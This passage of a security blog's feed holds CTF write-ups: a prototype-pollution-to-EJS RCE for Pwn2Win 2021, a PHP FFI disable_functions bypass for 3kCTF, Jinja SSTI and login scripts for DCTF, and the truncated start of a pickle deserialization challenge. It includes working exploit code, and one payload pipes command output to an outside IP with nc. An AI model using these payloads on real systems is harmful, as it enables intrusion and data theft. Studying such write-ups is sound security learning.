tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>renderFile()</code> 메서드 하단을 보면 <code>tryHandleCache()</code> 메서드를 호출하는 것을 볼 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="keyword">if</span> (!cb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">exports</span>.promiseImpl == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">exports</span>.promiseImpl(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          result = handleCache(options)(data);</span><br><span class="line">          resolve(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          reject(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Please provide a callback function&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> cb(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cb(<span class="literal">null</span>, result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tryHandleCache()</code> 메서드에서는 <code>handleCache()</code> 메서드를 호출하는 것을 볼 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;cache option requires a filename&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    func = <span class="built_in">exports</span>.cache.get(filename);</span><br><span class="line">    <span class="keyword">if</span> (func) &#123;</span><br><span class="line">      <span class="keyword">return</span> func;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hasTemplate) &#123;</span><br><span class="line">      template = fileLoader(filename).toString().replace(_BOM, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!hasTemplate) &#123;</span><br><span class="line">    <span class="comment">// istanbul ignore if: should not happen at all</span></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Internal EJS error: no file name or template &#x27;</span></span><br><span class="line">                    + <span class="string">&#x27;provided&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    template = fileLoader(filename).toString().replace(_BOM, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  func = <span class="built_in">exports</span>.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    <span class="built_in">exports</span>.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>handleCache()</code> 메서드에서는 <code>export.compile()</code> 메서드를 또 호출한다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// v1 compat</span></span><br><span class="line">  <span class="comment">// &#x27;scope&#x27; is &#x27;context&#x27;</span></span><br><span class="line">  <span class="comment">// <span class="doctag">FIXME:</span> Remove this in a future version</span></span><br><span class="line">  <span class="keyword">if</span> (opts &amp;&amp; opts.scope) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!scopeOptionWarned)&#123;</span><br><span class="line">      <span class="built_in">console</span>.warn(<span class="string">&#x27;`scope` option is deprecated and will be removed in EJS 3&#x27;</span>);</span><br><span class="line">      scopeOptionWarned = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!opts.context) &#123;</span><br><span class="line">      opts.context = opts.scope;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> opts.scope;</span><br><span class="line">  &#125;</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>export.compile()</code> 메서드에서는 <code>Tempalte()</code>이라는 객체를 생성자를 이용해서 생성하고, 생성한 템플릿 객체로 <code>compile()</code> 메서드를 실행하는 것을 볼 수 있다. ejs 모듈 내부는 처음보는데 아마 이 <code>Template()</code> 객체가 웹 프론트 단에 출력되는 부분인 거 같다. </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;string&#125;</span> </span>*/</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">this</span>.source) &#123;</span><br><span class="line">    <span class="built_in">this</span>.generateSource();</span><br><span class="line">    prepended +=</span><br><span class="line">      <span class="string">&#x27;  var __output = &quot;&quot;;\n&#x27;</span> +</span><br><span class="line">      <span class="string">&#x27;  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">      prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p><code>compile()</code> 메서드를 확인 해보면 <code>outputFunctionName</code>을 이용해서 문자열을 만드는 것을 볼 수 있다. 즉, 우리는 <code>applyPatch()</code>에서 발생하는 <code>Prototype Pollution</code> 취약점을 이용해서 <code>compile()</code> 메서드에서 사용되는 <code>outputFunctionName</code> 값을 잘 조작해 문자열을 맞춰 RCE를 발생시켜야 한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;change_status HTTP&#x2F;1.1</span><br><span class="line">Host: illusion.pwn2win.party:44211</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Authorization: Basic YWRtaW46cXp0bG5mdXlzZXVxeWpmaQ&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.212 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: ko-KR,ko;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: _ga&#x3D;GA1.2.687081227.1622238128; _gid&#x3D;GA1.2.492571223.1622429990</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 155</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;constructor&#x2F;prototype&#x2F;outputFunctionName&quot;: &quot;_; process.mainModule.require(&#39;child_process&#39;).execSync(&#39;.&#x2F;readflag | nc 141.164.52.207 80&#39;);&#x2F;&#x2F;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그래서 위와 같이 값을 보내 <code>Prototype Pollution</code>을 이용해서 <code>outputFunctionName</code>의 값을 <code>value</code> 값으로 오염을 시켜주었다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/flag.png?raw=true"></p><p>그리고 index 페이지로 접속을 하게 되면 <code>ejs.renderFile()</code> 메서드가 실행 될 때, 이미 <code>outputFunctionName</code>의 값이 js exploit code로 오염이 되어 있어 RCE가 발생해 플래그를 얻을 수 있었다.</p><blockquote><p>FLAG : CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}</p></blockquote><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications</a><br><a href="https://betterprogramming.pub/prototypes-in-javascript-5bba2990e04b">https://betterprogramming.pub/prototypes-in-javascript-5bba2990e04b</a><br><a href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262">https://github.com/Starcounter-Jack/JSON-Patch/pull/262</a><br><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a><br><a href="https://blog.effectrenan.com/pwn2win-2021-illusion-web-challenge/">https://blog.effectrenan.com/pwn2win-2021-illusion-web-challenge/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Analysis </category>
          
          <category> Prototype Pollution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Prototype Pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3k CTF 2021 Write Up</title>
      <link href="2021/05/17/2021-05-17-3kCTF-2021/"/>
      <url>2021/05/17/2021-05-17-3kCTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-online-compiler-425-pts"><a href="#Web-online-compiler-425-pts" class="headerlink" title="(Web) online_compiler [425 pts]"></a>(Web) online_compiler [425 pts]</h2><blockquote><p>online_compiler challenge is bypass the disable_functions and get the flag.</p></blockquote><p>First at challenge, Given the <code>back-end</code> code and <code>php.ini</code> file. When execute the php code at <code>back-end</code> you just need to checked the execute based on <code>php.ini</code> file. If u check the <code>php.ini</code> file, you will see many functions are disabled based on <code>disable_functions</code>. Deservedly, Was disabled function that shell command can be execute.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/1.png?raw=true"></p><p>But, Because <code>phpinfo()</code> is not disabled, I can check the <code>PHP Version</code> as above and can know using the <code>7.4.X</code> version in server. So, I did a search for vulnerabilities that occur in that version.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-16%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.00.45.png?raw=true"><br><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.43.32.png?raw=true"></p><p>I found content as above while gooling. I did a gooling keyword is <code>php 7.4 disable_functions bypass</code>. As above content is one among several bypass list. So, I checked <code>FFI</code> in <code>phpinfo()</code> and it was enabled.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.31.49.png?raw=true"></p><p>I did say without thinking <code>&quot;This seem the most possible&quot;</code> to <code>jingyu</code> bro on may 7 pm 7 hour. <code>Fucking</code>, After that, I did googling for another 2 hour.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.30.48.png?raw=true"></p><p>First, I first looked at <code>FFI</code> and it stands for <code>Foreign function interface</code>, which is an external function interface, but I didn’t know how to use it. Then I found a strange article, and I could see the <code>cdef()</code> method used in the <code>FFI</code> class. It can be seen that an object is created by inserting a C language function prototype as the argument value of <code>cdef()</code>, and an external function is executed by referring to the function prototype created from the object.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.39.19.png?raw=true"></p><p>The prototype of the C Language system() function was as above. It seems like it was because I didn’t do it as a pointer variable when I just did `const char command’.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line">  <span class="variable">$ffi</span>-&gt;system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>So, as a result, the payload was written as above. At first, like the picture above, the library file was also passed as a parameter, but it didn’t work well when passed. Probably because there is no file in the same path, it seems like that, but even without it, there was no problem.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.50.22.png?raw=true"></p><p>When I wrote the code in Python and checked it, the <code>El_FlAAG___FilEE</code> file existed in the upper directory. So when I read the file, a flag came out. In the end, it was correct that I did say to <code>jingyu</code> bro on 7 pm earlier. zz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://onlinecompiler.2021.3k.ctf.to:5000/&#x27;</span></span><br><span class="line">path = [<span class="string">&#x27;save&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    command = raw_input(<span class="string">&quot;pocas@py : &quot;</span>)</span><br><span class="line">    c_type, code = <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;&lt;?php $ffi=FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(\&#x27;&#123;&#125;\&#x27;);?&gt;&#x27;</span>.<span class="built_in">format</span>(command)</span><br><span class="line">    body1 = &#123;<span class="string">&#x27;c_type&#x27;</span>:c_type, <span class="string">&#x27;code&#x27;</span>:code&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># save</span></span><br><span class="line">    filename = requests.post(url + path[<span class="number">0</span>], data=body1).text</span><br><span class="line">    log.info(<span class="string">&quot;Exploitation&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;filename : &quot;</span> + filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compile</span></span><br><span class="line">    body2 = &#123;<span class="string">&#x27;c_type&#x27;</span>:c_type, <span class="string">&#x27;filename&#x27;</span>:filename&#125;</span><br><span class="line">    result = requests.post(url + path[<span class="number">1</span>], data=body2).text.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;result : &quot;</span> + result)</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : 3k{JuSt_A_WaRmUp_O.o}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DCTF 2021 Write Up</title>
      <link href="2021/05/17/2021-05-17-dCTF-2021/"/>
      <url>2021/05/17/2021-05-17-dCTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Simple-web-xxx-pts"><a href="#Web-Simple-web-xxx-pts" class="headerlink" title="(Web) Simple web [xxx pts]"></a>(Web) Simple web [xxx pts]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag&quot;</span></span><br><span class="line">FormData = &#123;<span class="string">&#x27;flag&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;auth&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url, data=FormData).text</span><br><span class="line">log.info(res)</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : dctf{w3b_c4n_b3_fun_r1ght?}</p></blockquote><hr><h2 id="Web-Injection-xxx-pts"><a href="#Web-Injection-xxx-pts" class="headerlink" title="(Web) Injection [xxx pts]"></a>(Web) Injection [xxx pts]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Occur SSTI Vuln in 404 page</span></span><br><span class="line">url = <span class="string">&#x27;http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/&#x27;</span></span><br><span class="line">ssti = [<span class="string">&quot;&#123;&#123;79&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat app.py&#x27;).read()&#125;&#125;&quot;</span>]</span><br><span class="line">string = [<span class="string">&quot;Checked SSTI&quot;</span>, <span class="string">&quot;Execute ls&quot;</span>, <span class="string">&quot;Show app.py&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Exploit&quot;</span>)</span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="comment"># If u look at app.py, you can see that /login is using validate_login().</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssti)):</span><br><span class="line">    res = requests.get(url+ssti[i]).text.replace(<span class="string">&quot;&amp;#39;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">    log.info(string[i])</span><br><span class="line">    log.info(<span class="string">&quot; &gt; &quot;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="comment"># If u look at validate_login() in securit.py, you can know the password used by the server.</span></span><br><span class="line">ssti = [<span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls lib&#x27;).read()&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat lib/security.py&#x27;).read()&#125;&#125;&quot;</span>]</span><br><span class="line">string = [<span class="string">&quot;Checked lib&quot;</span>, <span class="string">&quot;Show lib/security.py&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssti)):</span><br><span class="line">    res = requests.get(url + ssti[i]).text.replace(<span class="string">&quot;&amp;#39;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">    log.info(string[i])</span><br><span class="line">    log.info(<span class="string">&quot; &gt; &quot;</span> + res)</span><br><span class="line"></span><br><span class="line">valid_password = <span class="string">&quot;==QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ&quot;</span></span><br><span class="line">log.info(base64.b64decode(valid_password[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : dctf{4ll_us3r_1nput_1s_3v1l}</p></blockquote><hr><h2 id="Web-Very-secure-website-200-pts"><a href="#Web-Very-secure-website-200-pts" class="headerlink" title="(Web) Very secure website [200 pts]"></a>(Web) Very secure website [200 pts]</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;dctf1-chall-very-secure-site.westeurope.azurecontainer.io&#x2F;login.php?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&#39;</span><br><span class="line">account &#x3D; [&#39;admin&#39;, &#39;479763000&#39;]</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(url.format(account[0], account[1])).text</span><br><span class="line">log.info(&quot;Exploit&quot;)</span><br><span class="line">log.info(res)</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : dctf{It’s_magic._I_ain’t_gotta_explain_shit.}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> ETC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2021 Write Up</title>
      <link href="2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"/>
      <url>2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>심심해서 4일에 1시간 정도했는데 역시 해킹은 취미가 딱인 거 같다 :)</p><hr><h2 id="Web-Jar-70-pts"><a href="#Web-Jar-70-pts" class="headerlink" title="(Web) Jar [70 pts]"></a>(Web) Jar [70 pts]</h2><blockquote><p>Jar 문제는 Python Pickle 모듈에서 발생하는 역직렬화 RCE 취약점을 이용해 플래그를 획득하는 문제입니다.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;actf&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle.jpg&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span>():</span></span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">&#x27;pickle.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = 